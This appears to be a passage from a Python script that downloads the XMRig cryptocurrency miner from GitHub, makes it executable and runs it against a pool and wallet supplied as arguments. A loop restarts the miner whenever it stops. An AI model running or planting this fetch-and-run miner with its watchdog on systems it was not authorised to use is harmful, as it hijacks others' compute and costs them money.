os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz")
	os.system("tar -xvf xmrig-6.17.0-linux-x64.tar.gz")
	os.system("chmod +x *")
	os.system("./xmrig-6.17.0/xmrig --donate-level 1 -o " + sys.argv[3] + " -u " + sys.argv[1] + " --rig-id " + sys.argv[2] + " -k &")
	time.sleep(30)
	while 1 < 6:
		if len(os.popen('pgrep -l xmrig').readlines()) == 0:
			os.system("./xmrig-6.17.0/xmrig --donate-level 1 -o " + sys.argv[3] + " -u " + sys.argv[1] + " --rig-id " + sys.argv[2] + " -k &")
			print("restarted xmrig")
		time.sleep(120)
